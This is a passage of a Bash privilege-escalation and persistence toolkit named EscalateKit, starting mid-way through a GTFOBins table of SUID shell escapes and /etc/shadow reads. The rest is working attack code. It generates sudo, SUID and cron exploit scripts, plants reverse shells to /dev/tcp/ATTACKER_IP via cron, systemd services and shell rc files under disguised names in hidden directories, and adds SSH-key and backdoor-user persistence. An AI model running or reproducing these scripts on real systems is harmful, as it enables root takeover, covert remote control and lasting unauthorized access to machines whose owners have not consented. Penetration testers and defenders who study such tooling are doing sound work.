more:suid:./more /etc/shadow
nano:suid:./nano /etc/shadow
perl:suid:./perl -e 'exec "/bin/sh";'
php:suid:./php -r "pcntl_exec('/bin/sh', ['-p']);"
python:suid:./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3:suid:./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
ruby:suid:./ruby -e 'exec "/bin/sh -p"'
sh:suid:./sh -p
tar:suid:./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
vi:suid:./vi -c ':!/bin/sh -p'
vim:suid:./vim -c ':!/bin/sh -p'
zsh:suid:./zsh
EOF

    log_message "INFOS" "GTFOBins data initialized"
}

# Function to check if a binary is in GTFOBins
check_gtfobins() {
    local binary="$1"
    local type="$2"

    # Make sure GTFOBins data is initialized
    if [ ! -f "$GTFOBINS_DATA" ]; then
        init_gtfobins
    fi

    # Search for the binary and privilege type in GTFOBins data
    if grep -q "^$binary:$type:" "$GTFOBINS_DATA"; then
        echo -e "\n[+] $binary can be exploited via $type!"
        echo "    Exploit command:"
        grep "^$binary:$type:" "$GTFOBINS_DATA" | cut -d: -f3
        return 0
    fi

    return 1
}

# ----------------------------------------------------------------------
# Exploitation Module
# ----------------------------------------------------------------------

exploit_suggest() {
    log_message "INFOS" "Suggesting exploitation paths"

    mkdir -p "$OUTPUT_DIR/exploit"
    local output_file="$OUTPUT_DIR/exploit/suggestions.txt"

    echo "--- Exploitation Suggestions ---" >"$output_file"

    # Check if recon has been run
    if [ ! -d "$OUTPUT_DIR/recon" ]; then
        echo "[-] Reconnaissance data not found. Run the recon module first." >>"$output_file"
        log_message "WARN" "Reconnaissance data not found. Run the recon module first."
        return 1
    fi

    # Check sudo privileges
    if [ -f "$OUTPUT_DIR/recon/sudo_privs.txt" ]; then
        echo "[*] Analyzing sudo privileges..." >>"$output_file"

        # Extract GTFOBins matches
        sudo_gtfo=$(grep -A 5 "GTFOBins Matches" "$OUTPUT_DIR/recon/sudo_privs.txt")

        if echo "$sudo_gtfo" | grep -q "can be exploited"; then
            echo "[+] Sudo privilege escalation possible!" >>"$output_file"
            echo "$sudo_gtfo" >>"$output_file"
            echo "    This is the most reliable method. Try it first." >>"$output_file"
        fi
    fi

    # Check SUID files
    if [ -f "$OUTPUT_DIR/recon/suid_files.txt" ]; then
        echo -e "\n[*] Analyzing SUID binaries..." >>"$output_file"

        # Extract GTFOBins matches
        suid_gtfo=$(grep -A 5 "GTFOBins SUID Matches" "$OUTPUT_DIR/recon/suid_files.txt")

        if echo "$suid_gtfo" | grep -q "can be exploited"; then
            echo "[+] SUID binary exploitation possible!" >>"$output_file"
            echo "$suid_gtfo" >>"$output_file"
        fi
    fi

    # Check writable files
    if [ -f "$OUTPUT_DIR/recon/writable_files.txt" ]; then
        echo -e "\n[*] Analyzing writable files..." >>"$output_file"

        # Check for writable /etc files
        if grep -q "/etc/" "$OUTPUT_DIR/recon/writable_files.txt"; then
            echo "[+] Writable files in /etc detected!" >>"$output_file"
            grep "/etc/" "$OUTPUT_DIR/recon/writable_files.txt" | head -n 5 >>"$output_file"
            echo "    These can be modified to potentially gain privileges." >>"$output_file"
        fi

        # Check for writable service files
        if grep -q "systemd" "$OUTPUT_DIR/recon/writable_files.txt"; then
            echo "[+] Writable systemd service files detected!" >>"$output_file"
            grep "systemd" "$OUTPUT_DIR/recon/writable_files.txt" | head -n 5 >>"$output_file"
            echo "    These can be modified to run commands as root on service restart." >>"$output_file"
        fi
    fi

    # Check kernel exploits
    if [ -f "$OUTPUT_DIR/recon/kernel_exploits.txt" ]; then
        echo -e "\n[*] Analyzing kernel vulnerabilities..." >>"$output_file"

        kernel_vulns=$(grep -A 3 "Potentially vulnerable" "$OUTPUT_DIR/recon/kernel_exploits.txt")

        if [ -n "$kernel_vulns" ]; then
            echo "[+] Kernel vulnerabilities detected!" >>"$output_file"
            echo "$kernel_vulns" >>"$output_file"
        fi
    fi

    # Check cron jobs
    if [ -f "$OUTPUT_DIR/recon/cron_jobs.txt" ]; then
        echo -e "\n[*] Analyzing cron jobs..." >>"$output_file"

        writable_cron=$(grep "Writable cron script" "$OUTPUT_DIR/recon/cron_jobs.txt")

        if [ -n "$writable_cron" ]; then
            echo "[+] Writable cron scripts detected!" >>"$output_file"
            echo "$writable_cron" >>"$output_file"
            echo "    These can be modified to execute commands when the cron job runs." >>"$output_file"
        fi
    fi

    # Generate an exploit priority list
    echo -e "\n--- Exploit Priority List ---" >>"$output_file"

    # Check for the most promising vectors and sort them
    if grep -q "Sudo privilege escalation possible" "$output_file"; then
        echo "1. Sudo privileges (Easiest method)" >>"$output_file"
    fi

    if grep -q "Writable cron scripts detected" "$output_file"; then
        echo "2. Writable cron scripts (Reliable method)" >>"$output_file"
    fi

    if grep -q "Writable systemd service files detected" "$output_file"; then
        echo "3. Writable service files (Requires service restart)" >>"$output_file"
    fi

    if grep -q "SUID binary exploitation possible" "$output_file"; then
        echo "4. SUID binary exploitation" >>"$output_file"
    fi

    if grep -q "Kernel vulnerabilities detected" "$output_file"; then
        echo "5. Kernel exploitation (Most complex, risk of system crash)" >>"$output_file"
    fi

    # If no clear vectors are found
    if ! grep -q -E "(Sudo|cron|service|SUID|Kernel)" "$output_file"; then
        echo "[-] No clear privilege escalation vectors identified." >>"$output_file"
        echo "    Consider manual enumeration or running more detailed recon." >>"$output_file"
    fi

    log_message "INFOS" "Exploitation suggestions saved to $output_file"
    return 0
}

exploit_generate_templates() {
    log_message "INFOS" "Generating exploit templates"

    mkdir -p "$OUTPUT_DIR/exploit/templates"

    # Check if suggestions exist
    if [ ! -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        log_message "WARN" "Exploitation suggestions not found. Run the exploit suggest module first."
        return 1
    fi

    # Check for sudo exploits
    if grep -q "Sudo privilege escalation possible" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating sudo exploit templates"

        # Extract the binary and command
        sudo_binary=$(grep -A 5 "can be exploited via sudo" "$OUTPUT_DIR/exploit/suggestions.txt" | grep -oE "^[a-zA-Z0-9_-]+" | head -n 1)
        sudo_command=$(grep -A 5 "can be exploited via sudo" "$OUTPUT_DIR/exploit/suggestions.txt" | grep "Exploit command:" | cut -d: -f2-)

        if [ -n "$sudo_binary" ] && [ -n "$sudo_command" ]; then
            echo "#!/bin/bash" >"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "# Exploit for $sudo_binary via sudo" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "# Command to run:" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "$sudo_command" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            echo "# This will spawn a root shell if successful" >>"$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"

            chmod +x "$OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
            log_message "INFOS" "Sudo exploit template saved to $OUTPUT_DIR/exploit/templates/sudo_exploit.sh"
        fi
    fi

    # Check for SUID exploits
    if grep -q "SUID binary exploitation possible" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating SUID exploit templates"

        # Extract the binary and command
        suid_binary=$(grep -A 5 "can be exploited via suid" "$OUTPUT_DIR/exploit/suggestions.txt" | grep -oE "^[a-zA-Z0-9_-]+" | head -n 1)
        suid_command=$(grep -A 5 "can be exploited via suid" "$OUTPUT_DIR/exploit/suggestions.txt" | grep "Exploit command:" | cut -d: -f2-)

        if [ -n "$suid_binary" ] && [ -n "$suid_command" ]; then
            echo "#!/bin/bash" >"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "# Exploit for $suid_binary via SUID" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "# Command to run:" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "$suid_command" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            echo "# This will spawn a privileged shell if successful" >>"$OUTPUT_DIR/exploit/templates/suid_exploit.sh"

            chmod +x "$OUTPUT_DIR/exploit/templates/suid_exploit.sh"
            log_message "INFOS" "SUID exploit template saved to $OUTPUT_DIR/exploit/templates/suid_exploit.sh"
        fi
    fi

    # Generate cron exploit template if writable cron scripts are found
    if grep -q "Writable cron scripts detected" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating cron exploit template"

        # Extract the writable cron script path
        cron_script=$(grep "Writable cron script found:" "$OUTPUT_DIR/exploit/suggestions.txt" | head -n 1 | awk '{print $NF}')

        if [ -n "$cron_script" ]; then
            echo "#!/bin/bash" >"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Exploit for writable cron script: $cron_script" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Backup the original script" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "cp \"$cron_script\" \"$cron_script.bak\"" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Create a reverse shell payload" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "cat > \"$cron_script\" << 'EOF'" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "#!/bin/bash" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Original script functionality (replace this with actual functionality if needed)" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# [Original commands here]" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Reverse shell payload" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Alternative: Add a privileged user" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# useradd -m -s /bin/bash -G sudo hacker && echo 'hacker:password' | chpasswd" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "EOF" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "# Make the script executable" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "chmod +x \"$cron_script\"" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "echo \"[+] Cron exploit deployed to $cron_script\"" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "echo \"[+] Set up a listener with: nc -lvnp ATTACKER_PORT\"" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            echo "echo \"[+] Wait for the cron job to execute\"" >>"$OUTPUT_DIR/exploit/templates/cron_exploit.sh"

            chmod +x "$OUTPUT_DIR/exploit/templates/cron_exploit.sh"
            log_message "INFOS" "Cron exploit template saved to $OUTPUT_DIR/exploit/templates/cron_exploit.sh"
        fi
    fi

    log_message "INFOS" "Exploit templates generated in $OUTPUT_DIR/exploit/templates/"
    return 0
}

# ----------------------------------------------------------------------
# Persistence Module
# ----------------------------------------------------------------------

persist_ssh_key() {
    log_message "INFOS" "Setting up SSH key persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/ssh_key.txt"

    echo "--- SSH Key Persistence ---" >"$output_file"

    # Check if we have a home directory
    current_user=$(whoami)
    home_dir=$(eval echo ~$current_user)

    if [ ! -d "$home_dir" ]; then
        echo "[-] Home directory not found or not accessible" >>"$output_file"
        log_message "ERROR" "Home directory not found or not accessible"
        return 1
    fi

    # Create SSH directory if it doesn't exist
    ssh_dir="$home_dir/.ssh"
    if [ ! -d "$ssh_dir" ]; then
        mkdir -p "$ssh_dir" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "[-] Could not create SSH directory: $ssh_dir" >>"$output_file"
            log_message "ERROR" "Could not create SSH directory: $ssh_dir"
            return 1
        fi
    fi

    # Check/create authorized_keys file
    auth_keys="$ssh_dir/authorized_keys"
    touch "$auth_keys" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create or access authorized_keys file: $auth_keys" >>"$output_file"
        log_message "ERROR" "Could not create or access authorized_keys file: $auth_keys"
        return 1
    fi

    # Generate persistence template
    echo "[+] SSH key persistence method:" >>"$output_file"
    echo "    1. Generate an SSH key pair on your attack machine:" >>"$output_file"
    echo "       ssh-keygen -t ed25519 -f ./persist_key -N ''" >>"$output_file"
    echo "    2. Add the public key to authorized_keys on the target:" >>"$output_file"
    echo "       echo 'ssh-ed25519 AAA...' >> $auth_keys" >>"$output_file"
    echo "    3. Connect using the private key:" >>"$output_file"
    echo "       ssh -i persist_key $current_user@<target_ip>" >>"$output_file"

    # Create a script to add the key
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "# SSH Key Persistence Script" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "# Replace YOUR_PUBLIC_KEY with your actual public key" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "PUBLIC_KEY=\"YOUR_PUBLIC_KEY\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "# Add the key to authorized_keys" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "mkdir -p \"$ssh_dir\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "echo \"\$PUBLIC_KEY\" >> \"$auth_keys\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "chmod 700 \"$ssh_dir\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "chmod 600 \"$auth_keys\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"
    echo "echo \"[+] SSH key added to $auth_keys\"" >>"$OUTPUT_DIR/persist/add_ssh_key.sh"

    chmod +x "$OUTPUT_DIR/persist/add_ssh_key.sh"

    echo "[+] SSH key persistence script created: $OUTPUT_DIR/persist/add_ssh_key.sh" >>"$output_file"
    log_message "INFOS" "SSH key persistence setup complete"

    return 0
}

persist_cron_job() {
    log_message "INFOS" "Setting up cron job persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/cron_job.txt"

    echo "--- Cron Job Persistence ---" >"$output_file"

    # Check if we can access user crontab
    if ! command -v crontab >/dev/null 2>&1; then
        echo "[-] crontab command not found" >>"$output_file"
        log_message "ERROR" "crontab command not found"
        return 1
    fi

    # Create a hidden directory for the persistence script
    hidden_dir="$HOME/.cache/.persist"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    # Create the persistence script
    persist_script="$hidden_dir/update.sh"
    echo "#!/bin/bash" >"$persist_script"
    echo "# Hidden persistence script" >>"$persist_script"
    echo "# Reverse shell payload - replace ATTACKER_IP and ATTACKER_PORT" >>"$persist_script"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &" >>"$persist_script"
    chmod +x "$persist_script"

    # Create a script to add the cron job
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Cron Job Persistence Script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Hidden persistence script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Add cron job to run every 30 minutes" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "(crontab -l 2>/dev/null; echo \"*/30 * * * * $persist_script\") | crontab -" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "echo \"[+] Cron job persistence added to run every 30 minutes\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "echo \"[+] Persistence script located at: $persist_script\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"

    chmod +x "$OUTPUT_DIR/persist/add_cron_job.sh"

    echo "[+] Cron job persistence setup:" >>"$output_file"
    echo "    - Script location: $persist_script" >>"$output_file"
    echo "    - Schedule: Every 30 minutes" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_cron_job.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Cron job persistence setup complete"
    return 0
}

persist_systemd_service() {
    log_message "INFOS" "Setting up systemd service persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/systemd_service.txt"

    echo "--- Systemd Service Persistence ---" >"$output_file"

    # Check if systemd is present
    if ! command -v systemctl >/dev/null 2>&1; then
        echo "[-] systemctl command not found, systemd might not be in use" >>"$output_file"
        log_message "ERROR" "systemctl command not found, systemd might not be in use"
        return 1
    fi

    # Create a hidden directory for the persistence script
    hidden_dir="$HOME/.config/.system"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    # Create the persistence script
    persist_script="$hidden_dir/system_helper.sh"
    echo "#!/bin/bash" >"$persist_script"
    echo "# System helper script" >>"$persist_script"
    echo "# Reverse shell payload - replace ATTACKER_IP and ATTACKER_PORT" >>"$persist_script"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'" >>"$persist_script"
    chmod +x "$persist_script"

    # Service name and paths
    service_name="system-helper"
    user_service_dir="$HOME/.config/systemd/user"
    system_service_dir="/etc/systemd/system"

    # Create a script to set up the systemd service
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Systemd Service Persistence Script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# System helper script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Attempt to create a user-level service first" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "mkdir -p \"$user_service_dir\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "cat > \"$user_service_dir/$service_name.service\" << EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Unit]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Description=System Helper Service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Service]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Type=simple" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "ExecStart=$persist_script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Restart=always" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "RestartSec=60" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Install]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "WantedBy=default.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# Enable and start the user service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user daemon-reload 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user enable \"$service_name.service\" 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "systemctl --user start \"$service_name.service\" 2>/dev/null" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "# If we have sudo rights, try to create a system-wide service as well" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "if command -v sudo >/dev/null 2>&1 && sudo -l | grep -q systemctl; then" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    echo \"[+] Attempting to create system-wide service (requires sudo)...\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo tee \"$system_service_dir/$service_name.service\" > /dev/null << EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Unit]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Description=System Helper Service" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "After=network.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Service]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Type=simple" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "ExecStart=$persist_script" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "Restart=always" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "RestartSec=60" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "[Install]" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "WantedBy=multi-user.target" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl daemon-reload" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl enable \"$service_name.service\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "    sudo systemctl start \"$service_name.service\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "fi" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Systemd service persistence set up\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Service name: $service_name\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"
    echo "echo \"[+] Persistence script: $persist_script\"" >>"$OUTPUT_DIR/persist/add_systemd_service.sh"

    chmod +x "$OUTPUT_DIR/persist/add_systemd_service.sh"

    echo "[+] Systemd service persistence setup:" >>"$output_file"
    echo "    - Service name: $service_name" >>"$output_file"
    echo "    - Persistence script: $persist_script" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_systemd_service.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Systemd service persistence setup complete"
    return 0
}

persist_startup_file() {
    log_message "INFOS" "Setting up startup file persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/startup_file.txt"

    echo "--- Startup File Persistence ---" >"$output_file"

    # Define potential startup file locations
    bash_rc="$HOME/.bashrc"
    bash_profile="$HOME/.bash_profile"
    profile="$HOME/.profile"
    zsh_rc="$HOME/.zshrc"

    # Check which shell configuration files exist and are writable
    echo "[*] Checking available shell configuration files..." >>"$output_file"

    writable_configs=""

    for config_file in "$bash_rc" "$bash_profile" "$profile" "$zsh_rc"; do
        if [ -w "$config_file" ]; then
            echo "[+] Found writable config file: $config_file" >>"$output_file"
            writable_configs="$writable_configs $config_file"
        elif [ -f "$config_file" ]; then
            echo "[-] Config file exists but is not writable: $config_file" >>"$output_file"
        fi
    done

    if [ -z "$writable_configs" ]; then
        echo "[-] No writable shell configuration files found" >>"$output_file"
        log_message "ERROR" "No writable shell configuration files found"
        return 1
    fi

    # Create a hidden persistence script
    hidden_dir="$HOME/.local/share/.cache"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    persist_script="$hidden_dir/update-cache.sh"

    # Create a script to set up the startup file persistence
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Startup File Persistence Script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Hidden persistence script" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &) 2>/dev/null" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "# To avoid being too obvious, exit immediately if called interactively" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "if [[ \$- == *i* ]]; then true; fi" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    # Add to configuration files with a stealthy approach
    echo "# Add to shell configuration files" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    for config_file in $writable_configs; do
        echo "echo \"\" >> \"$config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"# Update system cache\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"[ -f \\\"$persist_script\\\" ] && . \\\"$persist_script\\\" &>/dev/null &\" >> \"$config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
        echo "echo \"[+] Added persistence to: $config_file\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    done
